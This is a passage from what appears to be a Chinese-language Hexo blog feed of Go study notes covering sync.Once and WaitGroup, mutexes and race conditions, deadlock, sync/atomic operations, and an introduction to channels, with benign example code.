类型的字段。它的作用是记录其所属值的Do 方法被调用的次数。</p><p>Do 方法在功能方面有两个特点：</p><ol><li>由于Do 方法只会在参数函数执行结束之后把done字段的值变为1，因此，如果参数函数的执行需要很长时间或者根本就不会结束（比如执行一些守护任务），那么就有可能会导致相关 goroutine 的同时阻塞。</li><li>Do方法在参数函数执行结束后，对done 字段的赋值用的是原子操作，并且，这一操作是被挂在defer 语句中的。因此，不论参数函数的执行会以怎样的方式结束，done字段的值都会变为1。也就是说，即使这个参数函数没有执行成功（比如引发了一个 panic），我们也无法使用同一个Once值重新执行它了。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>sync 代码包的 WaitGroup 类型和 Once 类型都是非常易用的同步工具，它们都是开箱即用和并发安全的</li><li>使用 WaitGroup 时，应避免出现计数器的值小于0 的情况，否则会引发 panic</li><li>使用 WaitGroup 时，应遵循 “先统一<code>Add</code>，再并发<code>Done</code>，最后<code>Wait</code>” 这种标准方式，不要在调用<code>Wait</code> 方法的同时，并发地通过调用<code>Add</code> 方法去增加其计数器的值，因为这也有可能引发 panic</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100013101" target="_blank" rel="noopener">Go 语言核心 36 讲</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——sync.Mutex与sync</title>
      <link href="/go-language-study-notes-sync-Mutex-and-sync/"/>
      <url>/go-language-study-notes-sync-Mutex-and-sync/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记主要来介绍 Go 的并发编程相关的核心知识——竞态条件、临界区、同步工具以及死锁。</p><a id="more"></a><h2 id="竞态条件"><a href="#竞态条件" class="headerlink" title="竞态条件"></a>竞态条件</h2><p><strong>如果两个或者多个 goroutine 在没有互相同步的情况下，访问某个共享的资源，并试图同时读和写这个资源，就处于相互竞争的状态，这种情况被称作竞争条件（race condition），也叫做竞争状态</strong>。</p><p>对一个共享资源的读和写操作必须是原子化的，换句话说，同一时刻只能有一个 goroutine 对共享资源进行读和写操作，否则就会出现并发安全问题，会破坏共享数据的一致性。</p><p>这种错误一般都很难发现和定位，排查起来的成本也是非常高的，所以一定要尽量避免。</p><p>下面通过一段示例代码来加深印象：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// counter 是一个全局共享变量</span></span><br><span class="line">counter <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// wg 用来等待程序结束</span></span><br><span class="line">wg sync.WaitGroup</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 计数增加2，表示等待两个 goroutine</span></span><br><span class="line">wg.Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> incCounter()</span><br><span class="line"><span class="keyword">go</span> incCounter()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待前面的两个 goroutine 结束</span></span><br><span class="line">wg.Wait()</span><br><span class="line">fmt.Println(<span class="string">"Final Counter:"</span>, counter)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">incCounter</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 保证 incCounter 函数退出时，通知 main goroutine</span></span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count := <span class="number">0</span>; count &lt; <span class="number">2</span>; count++ &#123;</span><br><span class="line"><span class="comment">// 捕获 counter 的值</span></span><br><span class="line">value := counter</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前 goroutine 从线程退出，并放回队列</span></span><br><span class="line">runtime.Gosched()</span><br><span class="line"><span class="comment">// 这里使用 runtime.Gosched() 函数，用来模拟发生 I/O 时，线程切换的场景</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加本地 value 变量的值</span></span><br><span class="line">value++</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将value 赋值给 counter</span></span><br><span class="line">counter = value</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码中，使用了 <code>runtime.Gosched()</code> 函数，用来模拟发生 I/O 时，线程切换的场景。</p><p>关于<code>sync.WaitGroup</code> 后面的笔记会详细介绍，这里只需要了解是用来阻塞 main goroutine 执行完直接退出的。</p><p>执行上面的示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Final Counter: <span class="number">2</span></span><br></pre></td></tr></table></figure><p>怎么会是 2 呢？\<br>每个 goroutine 各执行两次，一共是四次读写操作，应该是 4 才对呀。</p><p>这个就是共享资源引发的并发问题。</p><p>那么该如何解决呢？这通常就会涉及同步。</p><p>概括来讲，同步的用途有两个，<strong>一个是避免多个线程在同一时刻操作同一个数据块，另一个是协调多个线程，以避免它们在同一时刻执行同一个代码块</strong>。</p><p>由于这样的数据块和代码块的背后都隐含着一种或多种资源（比如存储资源、计算资源、I/O 资源、网络资源等等），所以可以把它们看做是共享资源，或者说共享资源的代表。</p><p>因此同步其实就是在控制多个线程对共享资源的访问——<strong>一个线程在想要访问某一个共享资源的时候，需要先申请对该资源的访问权限，并且只有在申请成功之后，访问才能真正开始</strong>。</p><p>而当线程对共享资源的访问结束时，它还<strong>必须归还对该资源的访问权限</strong>，若要再次访问仍需申请。</p><h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><p>可以把这里所说的访问权限想象成一块令牌，线程一旦拿到了令牌，就可以进入指定的区域，从而访问到资源，而一旦线程要离开这个区域了，就需要把令牌还回去，绝不能把令牌带走，因为一旦带走会引发死锁。</p><p>如果针对某个共享资源的访问令牌只有一块，那么在同一时刻，就最多只能有一个线程进入到那个区域，并访问到该资源。</p><p>这时，可以说，多个并发运行的线程对这个共享资源的访问是完全串行的。</p><p>只要一个代码片段需要实现对共享资源的串行化访问，就可以被视为一个<strong>临界区（critical section）</strong>。</p><p>比如，在上面的示例代码中，实现了数据块（counter 变量）写入操作的代码就共同组成了一个临界区。如果针对同一个共享资源，这样的代码片段有多个，那么它们就可以被称为<strong>相关临界区</strong>。</p><h2 id="同步工具"><a href="#同步工具" class="headerlink" title="同步工具"></a>同步工具</h2><p>临界区可以是一个内含了共享数据的结构体及其方法，也可以是操作同一块共享数据的多个函数。</p><p>临界区总是需要受到保护的，否则就会产生竞态条件。<strong>施加保护的重要手段之一，就是使用实现了某种同步机制的工具，也称为同步工具</strong>。</p><p>下面用一张图来更清晰地理解三者之间的关系：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221123171851.png" alt=""></p><p>在 Go 语言中，同步工具并不少。其中，最重要且最常用的同步工具当属<strong>互斥量（mutual exclusion，简称 mutex）</strong>。sync 包中的Mutex 就是与其对应的类型，该类型的值可以被称为互斥量或者互斥锁。</p><p>一个互斥锁可以被用来保护<strong>一个临界区</strong>或者<strong>一组相关临界区</strong>。</p><p>因为每当有 goroutine 想进入临界区时，都需要先对它进行锁定，并且，每个 goroutine 离开临界区时，都要及时地对它进行解锁。因此可以通过它来保证，在同一时刻只有一个 goroutine 处于该临界区之内。</p><p>下面使用互斥锁来修改前面的示例代码，看看是否可以达到预期结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">counter <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个 Mutex 类型的变量</span></span><br><span class="line">mu sync.Mutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">wg.Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> incCounter()</span><br><span class="line"><span class="keyword">go</span> incCounter()</span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br><span class="line">fmt.Println(<span class="string">"Final Counter:"</span>, counter)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">incCounter</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="comment">// 互斥量的零值是可用的，因此不需要初始化</span></span><br><span class="line">mu.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 解锁很重要，一定不能忘记</span></span><br><span class="line">mu.Unlock()</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count := <span class="number">0</span>; count &lt; <span class="number">2</span>; count++ &#123;</span><br><span class="line">value := counter</span><br><span class="line"></span><br><span class="line">runtime.Gosched()</span><br><span class="line"></span><br><span class="line">value++</span><br><span class="line"></span><br><span class="line">counter = value</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后的示例代码，声明了一个 <code>Mutex</code> 类型的变量，在 <code>incCounter()</code> 函数中（临界区），分别加锁 <code>mu.Lock()</code> 和解锁 <code>mu.Unlock</code> 了。</p><p>因为 defer 关键字的存在，解锁操作会在 <code>incCounter()</code> 函数调用完成之后，最后去解锁。</p><p>运行修改之后的示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Final Counter: <span class="number">4</span></span><br></pre></td></tr></table></figure><p>符合预期。</p><p>不过需要注意的是，这里使用互斥锁用来解决示例代码中的原子性问题，并不是最佳的，不能保证绝对的并发安全，至于为什么，以及又该选择什么方式解决原子性问题，可以看这篇笔记。</p><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p>Go 虽然提供了不少同步工具用来解决竞态条件的问题，但如果使用不当，不但会让程序变慢，还会大大增加死锁（deadlock）的可能性。</p><p>所谓的死锁，指的就是当前程序中的main goroutine，以及开发者自己“创建”的 goroutine（这些 goroutine 可以被统称为用户级的 goroutine） 都已经被阻塞。这就相当于整个程序都已经停滞不前了。</p><p>Go 语言运行时系统是不允许这种情况出现的，只要它发现所有的用户级 goroutine 都处于等待状态，就会自行抛出一个带有如下信息的 panic：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal error: all goroutines are asleep - deadlock!</span><br></pre></td></tr></table></figure><p><strong>注意，这种由 Go 语言运行时系统自行抛出的 panic 都属于致命错误，都是无法被恢复的，调用recover 函数对它们起不到任何作用。也就是说，一旦产生死锁，程序必然崩溃。</strong></p><p>因此，一定要尽可能避免死锁的发生。而最简单、有效的方式就是让每一个互斥锁都只保护一个临界区或一组相关临界区。</p><p>而且，对于同一个 goroutine 而言，既不要重复锁定一个互斥锁，也不要忘记对它进行解锁。</p><p>因此通常会在 <code>mu.Lock()</code> 操作的后面紧跟一个 <code>defer Unlock()</code>，这是最保险的一种做法。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>互斥锁常常被用来：保证多个 goroutine 并发地访问同一个共享资源时的完全串行</li><li>不要重复锁定互斥锁</li><li>不要忘记解锁互斥锁，通常配合使用 defer 语句解锁</li><li>不要对尚未锁定的互斥锁解锁</li><li>不要在多个函数之间直接传递互斥锁</li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——原子操作</title>
      <link href="/go-language-study-notes-atomic-operation/"/>
      <url>/go-language-study-notes-atomic-operation/</url>
      
        <content type="html"><![CDATA[<p>通过前面的笔记，了解到了 Go 的同步工具——互斥锁的相关知识。</p><p>通过对互斥锁的合理使用，可以使一个 goroutine 在执行临界区中的代码时，不被其他的 goroutine 打扰（保证临界区中代码的串行执行）。不过，虽然不会被打扰，但是它仍然可能会被中断（interruption）。</p><a id="more"></a><h2 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h2><p>通过前面学习 goroutine 的调度原理可以知道，goroutine 调度器会从本地运行队列依次调用队列中的 goroutine 与物理处理器 M 运行，</p><p>因此，在同一时刻，只可能有少数的 goroutine 真正地处于运行状态，并且这个数量只会与 M 的数量一致，而不会随着队列中的 goroutine 增多而增长。</p><p>当遇到阻塞的系统调用时，调度器会将等待系统调用的 goroutine 暂时换下，同时会从本地运行队列里换上另外一个 goroutine 来运行。</p><p>这里的换上的意思是，让一个 goroutine 由非运行状态转为运行状态，并促使其中的代码在某个 CPU 核心上执行。换下的意思正好相反，即：使一个 goroutine 中的代码中断执行，并让它由运行状态转为非运行状态。</p><p>这个中断的时机有很多，任何两条语句执行的间隙，甚至在某条语句执行的过程中都是可以的。</p><p>即使这些语句在临界区之内也是如此。所以，<strong>互斥锁虽然可以保证临界区中代码的串行执行，但却不能保证这些代码执行的原子性（atomicity）</strong>。</p><p>在众多的同步工具中，真正能够保证原子性执行的只有<strong>原子操作（atomic operation）</strong>。原子操作在进行的过程中是不允许中断的。在底层，这会由 CPU 提供芯片级别的支持，所以绝对有效。即使在拥有多 CPU 核心，或者多 CPU 的计算机系统中，原子操作的保证也是不可撼动的。</p><p>这使得原子操作可以完全地消除竞态条件，并能够绝对地保证并发安全性。并且，它的执行速度要比其他的同步工具快得多，通常会高出好几个数量级。不过，它的缺点也很明显。</p><p><strong>正是因为原子操作不能被中断，所以它需要足够简单，并且要求快速完成</strong>。</p><p>因为如果原子操作迟迟不能完成，而它又不会被中断，这将给计算机执行指令的效率带来很大的影响。</p><h2 id="sync-atomic"><a href="#sync-atomic" class="headerlink" title="sync.atomic"></a>sync.atomic</h2><p>Go 语言的原子操作当然是基于 CPU 和操作系统的，所以它也只针对少数数据类型的值提供了原子操作函数。这些函数都存在于标准库代码包 <a href="https://studygolang.com/pkgdoc" target="_blank" rel="noopener">sync/atomic</a> 中。</p><p><code>sync/atomic</code> 包中的函数可以做的原子操作有：</p><ul><li>加法（add）</li><li>比较并交换（compare and swap，简称 CAS）</li><li>加载（load）存储（store）和交换（swap）</li></ul><p>这些函数针对的数据类型并不多。但是，对这些类型中的每一个，<code>sync/atomic</code> 包都会有一套函数给予支持。这些数据类型有：<code>int32</code>、<code>int64</code>、<code>uint32</code>、<code>uint64</code>、<code>uintptr</code>，以及<code>unsafe</code> 包中的Pointer。不过，针对unsafe.Pointer类型，该包并未提供进行原子加法操作的函数。</p><p>下面这段示例代码，是介绍 <a href="https://www.0x2beace.com/go-language-study-notes-sync-Mutex-and-sync/">sync.Mutex与sync</a> 这篇笔记中的一段代码，当时虽然使用互斥锁解决了竞争条件，但是并没有保证绝对的并发安全，对于原子性问题，就应该使用原子操作来解决。</p><p>下面使用原子操作来解决：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">counter <span class="keyword">int32</span></span><br><span class="line">wg sync.WaitGroup</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">wg.Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> incCounter()</span><br><span class="line"><span class="keyword">go</span> incCounter()</span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br><span class="line">fmt.Println(<span class="string">"Final Counter:"</span>, counter)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">incCounter</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count := <span class="number">0</span>; count &lt; <span class="number">2</span>; count++ &#123;</span><br><span class="line"><span class="comment">// 当前 goroutine 从线程退出，并放回队列</span></span><br><span class="line">runtime.Gosched()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绝对安全地对 counter 加 1</span></span><br><span class="line">atomic.AddInt32(&amp;counter, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Final Counter: <span class="number">4</span></span><br></pre></td></tr></table></figure><p>可以看到，也是符合预期的。</p><h2 id="原子操作使用常见问题"><a href="#原子操作使用常见问题" class="headerlink" title="原子操作使用常见问题"></a>原子操作使用常见问题</h2><p>下面通过一些常见的问题，来更深入了解原子操作。</p><p><strong>1. 原子操作函数的第一个参数为什么必须是（整型）指针类型？</strong></p><p>因为整型作为函数参数是值传递，被传入的参数值都会被复制一份，对传入的参数进行修改是不会影响到原值的，因此，想要修改原值，就必须传入被被操作值的指针，而不是这个值本身。</p><p><strong>2. 用于原子加法操作的函数可以做原子减法吗？</strong></p><p>可以的，<code>atomic.AddInt32</code> 函数的第二个参数代表差量，它的类型可以是 <code>int32</code>，是有符号的。因此，如果想做原子减法，那么把这个差量设置为负整数就可以了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>不要把内部使用的原子值暴露给外界。比如，声明一个全局的原子变量并不是一个正确的做法。这个变量的访问权限最起码也应该是包级私有的。</li><li>如果不得不让包外，或模块外的代码使用你的原子值，那么可以声明一个包级私有的原子变量，然后再通过一个或多个公开的函数，让外界间接地使用到它。注意，这种情况下不要把原子值传递到外界，不论是传递原子值本身还是它的指针值。</li><li>如果通过某个函数可以向内部的原子值存储值的话，那么就应该在这个函数中先判断被存储值类型的合法性。若不合法，则应该直接返回对应的错误值，从而避免 panic 的发生。</li><li>如果可能的话，可以把原子值封装到一个数据类型中，比如一个结构体类型。这样，既可以通过该类型的方法更加安全地存储值，又可以在该类型中包含可存储值的合法类型信息。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100013101" target="_blank" rel="noopener">Go 语言核心 36 讲</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——channel</title>
      <link href="/go-language-study-notes-channel/"/>
      <url>/go-language-study-notes-channel/</url>
      
        <content type="html"><![CDATA[<p>如果 main goroutine 退出了，那么也意味着整个应用程序的退出。</p><p>此外，还要注意的是，goroutine 执行的函数或方法即便有返回值，Go 也会忽略这些返回值。所以，如果要获取 goroutine 执行后的返回值，需要另行考虑其他方法，比如通过 goroutine 间的通信来实现。</p><a id="more"></a><h2 id="goroutine-间的通信"><a href="#goroutine-间的通信" class="headerlink" title="goroutine 间的通信"></a>goroutine 间的通信</h2><p>传统的编程语言（C++、Java、Python 等）并非面向并发而生的，所以它们面对并发的逻辑多是基于操作系统的线程。</p><p>线程之间的通信，利用的也是操作系统提供的线程或进程间通信的原语，比如：共享内存、信号（signal）、管道（pipe）、消息队列、套接字（socket）等。</p><p>在这些通信原语中，使用最多、最广泛的（也是最高效的）是结合了线程同步原语（比如：锁以及更为低级的原子操作）的共享内存方式，因此，我们可以说传统语言的并发模型是基于对内存的共享的。</p><p>Go 语言从设计伊始，就将解决上面这个传统并发模型的问题作为 Go 的一个目标，并在新并发模型设计中借鉴了著名计算机科学家Tony Hoare提出的 CSP（Communicationing Sequential Processes，通信顺序进程）并发模型。</p><p>简单看下 CSP 的通信模型示意图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/CSP%E6%A8%A1%E5%9E%8B.png" alt=""></p><p>在 Go 中，与“Process”对应的是 goroutine。为了实现 CSP 并发模型中的输入和输出原语，Go 还引入了 goroutine（P）之间的通信原语channel。</p><p>goroutine 通过 channel 获取输入数据，再将处理后得到的结果通过 channel 输出。通过 channel 将 goroutine（P）组合连接在一起，让设计和编写大型并发系统变得更加简单和清晰。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/goroutine%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B.png" alt=""></p><p>比如上面提到的获取 goroutine 的退出状态，就可以使用 channel 原语实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">spawn</span><span class="params">(f <span class="keyword">func</span>()</span> <span class="title">error</span>) &lt;-<span class="title">chan</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> error)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        c &lt;- f()</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := spawn(<span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">        time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">"timeout"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    fmt.Println(&lt;-c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的实例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 延迟 2s 打印</span></span><br><span class="line">timeout</span><br></pre></td></tr></table></figure><p>该示例在 main.goroutine 与子 goroutine 之间建立一个元素类型为 error 的 channel，子 goroutine 退出时，会将它执行的函数的错误值写入这个 channel，main.goroutine 可以通过读取 channel 的值来获取子 gotouine 的退出状态。</p><h2 id="创建-channel"><a href="#创建-channel" class="headerlink" title="创建 channel"></a>创建 channel</h2><p>channel 也是一等公民。</p><p>可以像使用普通变量那样使用 channel，定义 channel 类型变量，给 channel 变量赋值，将 channel 作为参数传递给函数 / 方法、将 channel 作为返回值从函数 / 方法中返回，甚至将 channel 发送到其他 channel 中。</p><p>和切片、结构体、map 等一样，channel 也是一种复合数据类型。复合数据类型，在声明类型变量时，必须给出具体的元素类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ch <span class="keyword">chan</span> <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p>上面的示例代码中，声明了一个元素为 int 类型的 channel 类型变量 ch。</p><p>如果 channel 类型变量在声明时没有被赋予初值，那么它的默认值为 nil。</p><p>和其他复合类型不同的是，给 channel 类型变量赋初值的唯一方式就是 make 这个 Go 预定义函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line">ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>ch1 表示元素类型为 int 的 channel 类型，是<strong>无缓冲 channel</strong>; ch2 表示元素类型为 int 的 channel 类型，<strong>带缓冲 channel</strong>，且缓冲区长度为 5。</p><p>这两种类型变量关于发送（send）和接收（receive）的特性是不同的，下面基于这两种类型的 channel，看看 channel 类型变量如何进行发送和接收数据元素。</p><h2 id="发送与接收"><a href="#发送与接收" class="headerlink" title="发送与接收"></a>发送与接收</h2><p>Go 提供了&lt;-操作符用于对 channel 类型变量进行发送与接收操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ch1 &lt;- <span class="number">13</span>     <span class="comment">// 将整型字面值 13 发送到无缓冲 channel 类型变量 ch1 中</span></span><br><span class="line">n := &lt;- ch1   <span class="comment">// 将无缓冲 channel 类型变量 ch1 中接收的整型值存储到整型变量 n 中</span></span><br><span class="line">ch2 &lt;- <span class="number">17</span>     <span class="comment">// 将整型字面值 17 发送到带缓冲 channel 类型变量 ch2 中</span></span><br><span class="line">m := &lt;- ch2   <span class="comment">// 从带缓冲 channel 类型变量 ch2 中接收一个整型值存储到整型变量 m 中</span></span><br></pre></td></tr></table></figure><p>在理解 channel 的发送与接收操作时，你一定要始终牢记：<strong>channel 是用于 Goroutine 间通信的</strong>，所以绝大多数对 channel 的读写都被分别放在了不同的 Goroutine 中。</p><h3 id="无缓冲-channel"><a href="#无缓冲-channel" class="headerlink" title="无缓冲 channel"></a>无缓冲 channel</h3><p>由于无缓冲 channel 的运行时层实现不带有缓冲区，所有 goroutine 对无缓冲 channel 的接收和发送是同步的。</p><p>也就是说，对同一个无缓冲 channel，只有对它进行接收操作的 Goroutine 和对它进行发送操作的 Goroutine 都存在的情况下，通信才能得以进行，可以结合 goroutine 并发模型理解：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/goroutine%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B.png" alt=""></p><p>否则单方面的操作会让对应的 Goroutine 陷入挂起状态，比如下面示例代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line">    ch1 &lt;- <span class="number">13</span> <span class="comment">// fatal error: all goroutines are asleep - deadlock!</span></span><br><span class="line">    n := &lt;-ch1</span><br><span class="line">    <span class="built_in">println</span>(n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的示例中，创建了一个无缓冲 channel 类型变量 ch1，对 ch1 的读和写都放在一个 goroutine 中了（因为这里没有手动创建 goroutine，因此只有 main goroutine），因此陷入挂起状态了，这也是上面提到的，为什么要把对 channel 的读写放在不同的 goroutine 中的原因。</p><p>解决办法也很简单，只需要将接口操作或者发送操作放到另外一个 goroutine 中就可以了。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 